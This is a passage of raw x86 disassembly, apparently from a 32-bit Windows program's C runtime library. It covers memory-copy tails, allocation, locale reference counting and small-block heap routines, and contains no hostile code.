  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
